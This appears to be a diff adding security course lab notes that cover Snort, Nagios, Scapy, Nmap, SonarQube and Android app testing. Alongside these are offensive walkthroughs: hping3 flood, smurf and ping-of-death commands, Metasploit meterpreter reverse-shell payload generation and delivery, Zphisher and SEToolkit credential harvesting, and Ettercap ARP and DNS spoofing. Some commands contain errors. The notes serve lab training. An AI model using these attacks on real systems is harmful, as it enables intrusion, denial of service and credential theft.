@@ -1,0 +1,706 @@
+SNORT:
+
+sudo systemctl status snort
+
+sudo apt-get install snort -y
+cd /etc/snort
+
+sudo vim snort.conf 
+comment: #ipvar HOME_NET any
+
+add below:-
+ipvar HOME_NET 192.168.74.0/24
+
+for Comment all rules of snort :-
+
+sudo sed -i 's/^include \$RULE_PATH/#include \$RULE_PATH/' /etc/snort/snort.conf 
+
+except below:
+sudo include $RULE_PATH/local.rules
+
+sudo systemctl restart snort
+
+
+Writing rules:
+
+cd etc/snort/rules/
+
+sudo vim local.rules 
+
+for Comment all rules of snort :-
+ write all rules as asked
+​
+
+Live logs in console 
+
+sudo snort -A console -q -c ../snort.conf 
+
+Test if snort working:
+
+sudo snort -T -i ens37 -c ../snort.conf
+
+
+Rule examples :
+
+Src:kali
+
+action protocol src_ip src_port -> dst_ip dst_port (msg:"msg";sid:signature;rev:1;)
+
+alert icmp any any -> any any (msg:"sample ping detection";sid:1000001;rev:1)
+ 
+alert icmp any any -> $HOME_NET any (msg:"LARGE ICMP PACKET";dsize:>128;sid:1000001;)
+
+alert icmp any any -> $HOME_NET any (msg:"Flood Detected";detection_filter:track by_src,count 30,seconds 60;sid:1000002;)
+
+alert tcp any any -> $HOME_NET 80 (flags:S;msg:"TCP SYN Flood Detected";detection_filter:track by_src,count 20,seconds 60;sid:1000003;rev:1;)
+
+alert tcp any any -> $HOME_NET 22 (flow:to_server;msg:"SSH Brute Force Attempt";detection_filter:track by_src,count 5,seconds 60;sid:1000004;rev:1;)
+
+
+alert tcp any any -> 192.168.74.235 80 (msg:"keyword ADMIN";content:"admin"; sid :1000004;rev:1)
+alert tcp any any -> any any (msg:"kali detected";content:"kali";nocase;sid:1000005;)
+alert udp $HOME_NET any -> any 53 (msg:"Gmail Accessed";content:"gmail";nocase;sid:1000006;)
+alert udp $HOME_NET any -> any 53 (msg:"Facebook Accessed";content:"facebook";nocase;sid:1000007;)
+alert udp $HOME_NET any -> any 53 (msg:"Instagram Accessed";content:"instagram";nocase;sid:1000008;)
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NAGIOS
+
+​ova file nagiosxi open in vm 
+
+Open http://<ip>
+User:nagiosadmin
+Password:redhat
+
+CLIENT:
+Configure wizard -> linux server with Napa -> install Napa remote server
+
+Nagiosclient :(ubuntu)
+
+apt-get install apt-transport-https
+sudo mkdir -m 0755 -p /etc/apt/keyrings/
+
+curl -fsSL https://repo.nagios.com/GPG-KEY-NAGIOS-V3 | sudo gpg --dearmor -o /etc/apt/keyrings/GPG-KEY-NAGIOS-V3.gpg
+
+echo "Types: deb
+URIs: https://repo.nagios.com/deb/$(lsb_release -cs)
+Suites: /
+Signed-By: /etc/apt/keyrings/GPG-KEY-NAGIOS-V3.gpg" | sudo tee /etc/apt/sources.list.d/nagios.sources > /dev/null
+
+sudo apt-get update
+
+Edit sudo vim /usr/local/ncpa/etc/ncpa.cfg
+
+	community_string = my token
+Systemctl restart ncpa ,check ip
+
+
+Browswer:
+Ip of client , port 5693, token:mytoken 
+Next -> gets dashboard -> finish dashboard view status -Dashboard linux server  
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+SCAPY:
+
+sudo apt-get install python3-scapy -y
+scapy
+a = IP()
+b = TCP()
+a.show()
+b.show()
+a.src ='ip of source/attacker'
+a.dst = 'ip of victim'
+b.flags = 'FSA' ----> FLAGS TO SET
+send (a/b,count=2)
+send (a/b/ 'hiie guyzz',count=2)
+
+on other machine if it is snort write these rules and check logs
+alert icmp 192.168.74.166 any -> 192.168.74.235 any (msg:"ICMP Ping From Kali Detected"; sid:1000001; rev:1;)
+alert tcp 192.168.74.166 any -> 192.168.74.235 any (msg:"Scapy Custom TCP Message Received"; content:"hiie guyzz"; nocase; sid:1000009; rev:1;)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+HPING3 to FLOOD target:
+
+sudo hping3 --icmp <target's ip> --rand-source --flood
+
+SMURF ATTACK :
+
+sudo hping3 --icmp --flood -a <target-ip> <broadcast_address of target>
+example:  sudo hping3 --icmp --flood -a 192.168.74.235 192.168.74.255
+
+
+PING of DEATH:
+
+sudo hping3 --icmp --data 6555 --flood <target ip>
+sudo hping3 --icmp --data <packet payload size> --flood 192.168.74.235
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+METASPLOITE
+
+
+systemctl restart postgresql
+msfdb init
+db_status
+msfconsole
+
+FOR WINDOWS:
+>use payload/windows/x64/meterpreter/reverse_tcp
+>show options
+>set LHOST <IP OF ATTACKER>
+>set LPORT <port number>
+>generate -f exe -o <path to the .exe file>
+>back
+
+To handle the reverse connection:
+>use multi/handler
+>set LHOST <IP OF ATTACKER>
+>set LPORT <port number>
+>set payload windows/x64/meterpreter/reverse_tcp
+>show options
+>exploit
+
+To deliver payload to target:
+> python3 -m http.server --bind <attacker ip> 80 
+
+go to target machine to download the .exe file
+--> visit ip of attacker 
+(you now get the meterpreter session)
+
+
+FOR LINUX:
+>use payload/linux/x64/meterpreter/reverse_tcp
+>show options
+>set LHOST <IP OF ATTACKER>
+>set LPORT <port number>
+>generate -f elf -o <path to the .elf file>
+>back
+
+To handle the reverse connection:
+>use multi/handler
+>set LHOST <IP OF ATTACKER>
+>set LPORT <port number>
+>set payload linux/x64/meterpreter/reverse_tcp
+>show options
+>exploit
+
+To deliver payload to target:
+> python3 -m http.server --bind <attacker ip> 80 
+
+go to target machine to download the .elf file
+--> visit ip of attacker -->download the .elf file--> #chmod +x Downloads/linux.elf--> #./Linux.elf
+(you now get the meterpreter session on kali)
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NMAP commands
+
+simple scan
+nmap -sn <target ip>
+
+port scan
+nmap -F <target ip>
+
+first 1000 tcp port scan
+nmap <target ip>
+
+SYN scan(half open scan)
+nmap -sS <target ip>
+
+TCP scan
+nmap -sT <target ip>
+
+UDP
+nmap -sU <target ip>
+
+all ports 65535
+nmap -p- <target ip>
+
+version
+nmap -sV <target ip>
+
+OS
+nmap -O <target ip>
+
+all OS,version 
+nmap -A <target ip>
+
+safe script scan
+nmap -sC <target ip>
+
+vulnerability scan for target
+nmap --script vuln <target ip>
+
+malware scan
+nmap --script malware <target ip>
+
+
+firewall bypass
+nmap -f <target ip>
+
+Decoy Scan -mix fake ips with real ip
+nmap -D <fake ip1>,<fake ip2>,<attacker ip> <target ip>
+
+verbose sequential scan
+nmap -v -r <target ip>
+
+skip host discovery
+nmap -Pn <target ip>
+
+
+ICMP echo ping
+nmap -PE <target ip>
+
+
+
+save scan report
+
+sudo nmap \
+
+-sS \
+
+-sV \
+
+-sC \
+
+-O \
+
+-A \
+
+-p- \
+
+--version-all \
+
+--reason \
+
+--traceroute \
+
+--script "default,vuln,safe" \
+
+-T4 \
+
+-oA full_report \
+
+192.168.74.130
+
+
+
+
+
+
+
+
+
+sudo apt update
+
+sudo apt install xsltproc -yConvert the XML to HTML:
+
+xsltproc /usr/share/nmap/nmap.xsl full_report.xml -o full_report.html
+  
+xsltproc file.xml -o file.html
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Zphisher 
+
+
+Git clone https://github.com/htr-tech/zphisher.git
+Cd zphisher
+Bash zphisher.sh
+
+Create a fake page and get cress
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+SEToolkit
+
+Sudo setoolkit 
+Social engineering attack
+Website Attacke vector
+Credential harvestoing
+Site cloner
+
+Give exactor to clone 
+
+Take ip open it enter cress page reload will get cress in xml file .
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+ETTERCAP (ARP SPOOFING and DNS SPOOFING)
+
+
+Sudo apt install ettercap -G
+
+Sudo ettercap -G
+
+Click right , three dots -> Host -scan for host ->
+
+
+Client:
+arp -a --------- see MAC address
+
+KALI:
+
+Ettercap - host list - earth symbol - arp poisoning -OK 
+
+
+Client:
+Arp -a -----------all Mac same
+
+To stop click stop
+
+
+KALI
+Vim /etc/ettercap/etter.dns
+
+
+	*	A 	<self ip >
+	website_name which we want to spoof	A	<self ip>
+
+
+mkdir xcx
+Cd xyzzy
+cat>index.html 
+	hjjhijijj
+Python3 -m http-server --bind <self ip> 80
+
+
+KALI:
+Sudo ettercap -G
+
+Three dots - manage plugins double click dns spoofing (*)
+
+We will get same page that we created 
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+
+SONARQUBE:
+
+ISONARQUBE - INSTALLATION & SETUP NOTES
+
+======================================================
+1. INSTALL SONARQUBE (COMMUNITY BUILD - VIA DOCKER)
+======================================================
+
+Community build -> download SonarQube via Docker
+
+Run container:
+ docker run -d --name sonarqube-custom --restart unless-stopped -p 9000:9000 sonarqube:community
+
+Access the web interface:
+ http://localhost:9000
+ or
+ http://<host-ip>:9000
+
+Default login credentials:
+ Username: admin
+ Password: admin
+ (You will be prompted to set a new ID/password on first login)
+
+------------------------------------------------------
+IF THE DEFAULT IMAGE / SETUP DOESN'T WORK
+------------------------------------------------------
+Run with bootstrap checks disabled:
+
+ docker run -d --name sonarqube-custom --restart unless-stopped -p 9000:9000 -e SONAR_ES_BOOTSTRAP_CHECKS_DISABLE=true sonarqube:community
+
+
+======================================================
+2. CREATE A LOCAL PROJECT ON THE SONARQUBE DASHBOARD
+======================================================
+
+Steps:
+ Create Project -> Local Project
+
+ Project Name : ditiss
+ Project Key : ditiss
+ Main Branch Name : main
+
+ -> Follow the instance's default number of days (or customize)
+ -> Click Create
+
+
+======================================================
+3. ANALYSIS METHOD
+======================================================
+
+Analysis method -> Locally
+
+ -> Generate a project token
+ - Provide a token name
+ - Click Generate
+ - Copy the token (save it, shown only once)
+
+ -> Analyze your project (this generates the project token used for scanning)
+
+ Generate token for project -> edit number of days (token expiry) as needed
+
+
+======================================================
+4. INSTALL THE SCANNER (PYSONAR)
+======================================================
+
+Copy the scanner command from the SonarQube project setup page, OR:
+
+Choose common command based on OS (Linux / Windows / macOS):
+ -> Go to official download page
+ -> Select "Python" (pysonar)
+
+Install pysonar:
+ pip install pysonar-scanner --break-system-package
+
+Paste the 2nd command shown on the SonarQube site (project-specific run command),
+e.g.:
+ pysonar
+
+
+======================================================
+5. RUNNING A SCAN (ALTERNATIVE / MANUAL SETUP)
+======================================================
+
+If scanner not available as a package:
+
+ mkdir sonar
+ unzip <scanner-zip> -d sonar_folder
+
+ cd .sonar
+ ls
+ cat report-task.txt
+
+
+======================================================
+6. SCANNING A SAMPLE PROJECT (VULN-BANK)
+======================================================
+
+Clone the sample vulnerable project:
+ git clone <vulnbank-repo-url>
+ cd vuln-bank
+
+Install scanner in the project folder:
+ pip install pysonar --break-system-package
+
+Run the 2nd command from the SonarQube site (project token / run command):
+ pysonar
+
+
+======================================================
+QUICK WORKFLOW SUMMARY
+======================================================
+1. Run SonarQube via Docker (community edition)
+2. Login (admin/admin) -> set new credentials
+3. Create a local project (name, key, main branch)
+4. Choose Analysis Method -> Locally -> generate project token
+5. Install scanner (pysonar) via pip
+6. Run scanner command from SonarQube site inside the project folder
+7. View results on the SonarQube dashboard / report-task.txt
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Android App Security Testing – Notes
+*(Static & Dynamic Analysis – Campus360 App)*
+
+---
+
+## 1. Android Studio – Create an Emulator (AVD)
+
+1. Open Android Studio → **More Actions → Virtual Device Manager**
+2. Click **Create a Virtual Device**
+3. Select phone: **Pixel 6a**
+4. Click **Next**
+5. Select system image: **API 33 – "Tiramisu" – Android 13.0**
+6. Click **Download**, then **Finish**
+
+---
+
+## 2. Setup ADB Environment Variable (Windows)
+
+**Path to platform-tools:**
+```
+C:\Users\<your-username>\AppData\Local\Android\Sdk\platform-tools
+```
+
+**Steps:**
+1. Open **File Explorer** → Right-click **This PC** → **Properties**
+2. Go to **Advanced system settings**
+3. Click **Environment Variables**
+4. Under **System variables**, select **Path** → **Edit** → **New**
+5. Paste the path:
+```
+%LOCALAPPDATA%\Android\Sdk\platform-tools
+```
+6. Click **OK** → **Finish**
+
+**Verify setup (cmd):**
+```
+C:\> adb devices
+```
+Confirms the emulator/device is detected.
+
+---
+
+## 3. Rooting the AVD (rootAVD)
+
+1. Go to **GitLab** and clone (or download ZIP) the `rootAVD` repo:
+```
+git clone https://gitlab.com/newbit/rootAVD.git
+```
+2. Extract all files (if downloaded as ZIP)
+3. In cmd:
+```
+cd rootAVD
+```
+4. **List available AVD images:**
+```
+rootAVD.bat ListAllAVDs
+```
+→ shows the exact path to your AVD's `ramdisk.img` (or `ramdisk-qemu.img`)
+
+5. **Root the running AVD:**
+Run the root command against the correct `ramdisk.img` path found above.
+*(This installs the Magisk app version inside the emulator.)*
+
+6. **Reboot the emulator**
+
+7. **Configure Magisk:**
+- Open Magisk app → **Settings**
+- Enable **Zygisk**
+- Go to **Superuser** → **App and adb** → check the box → **Reboot**
+
+8. **Verify root access (cmd):**
+```
+adb root
+adb shell
+su
+# ← root access confirmed (prompt changes to #)
+```
+
+---
+
+## 4. Installing & Testing the Target App
+
+**Install APK via adb:**
+```
+C:\Users\<user>\Downloads> adb install campus360.apk
+```
+
+**Open Jadx-GUI** to review the decompiled source code of the app
+(e.g. mount source from an F: drive / working folder)
+
+---
+
+## 5. JADX GUI + Sensitive Data Exposure in Logs
+
+**Connect adb (example with explicit path):**
+```
+sudo ./mnt/c/Users/PG-ITISS/AppData/Local/Android/Sdk/platform-tools/adb.exe /bin/adb
+adb shell
+su
+```
+
+### ⚠️ Sensitive Data Exposure in Android Logs
+
+**View full system logs:**
+```
+adb logcat # entire Android OS log stream
+adb logcat -m <logs>
+```
+
+**Filter logs by app (pidcat):**
+```
+apt install pidcat -y
+pidcat <app_package_name> # logs specific to that app can be seen
+```
+
+➡️ **Finding:** The **OTP** value was visible in the logs.
+
+**Reproduction steps on Campus360 app:**
+1. Open Campus360 app → **Forgot Password**
+2. Enter phone number → OTP sent
+3. Enter OTP → Verified
+4. OTP value appears in `adb logcat` / `pidcat` output → **sensitive data exposure vulnerability**
+
+---
+
+## 6. Triggering an Activity Directly via ADB
+
+```
+adb shell su -c "am start -n com.campus360/com.campus360.activity.LoginActivity"
+```
+Used to launch a specific app activity directly (bypassing normal navigation) for testing.
+
+---
+
+## 7. Static & Dynamic Analysis – MobSF (Mobile Security Framework)
+
+**Tool:** Google Play Store / GitHub – MobSF
+Repo: `https://github.com/MobSF/Mobile-Security-Framework-MobSF`
+
+**Setup via Docker:**
+```
+docker system prune -a -f # removes any previous images (cleanup)
+docker pull opensecurity/mobile-security-framework-mobsf:latest
+```
+
+**Run the container:**
+```
+docker run -it --rm -p 8000:8000 -d opensecurity/mobile-security-framework-mobsf:latest
+```
+*Note: if a container of the same image is already running, it removes it and starts a new one.*
+
+**Default login credentials:**
+```
+Username: mobsf
+Password: mobsf
+```
+
+Access the dashboard at: `http://localhost:8000`
+Upload the APK for **static analysis**, and connect a device/emulator for **dynamic analysis**.
+
+---
+
+## Summary Workflow
+
+```
+Android Studio (create AVD)
+↓
+Setup ADB env variable
+↓
+Root the AVD (rootAVD + Magisk)
+↓
+Install target APK
+↓
+Review source (Jadx-GUI) + Monitor logs (logcat/pidcat)
+↓
+Identify vulnerabilities (e.g., OTP in logs)
+↓
+Trigger activities directly via adb (am start)
+↓
+Run full static/dynamic scan (MobSF via Docker)
+```
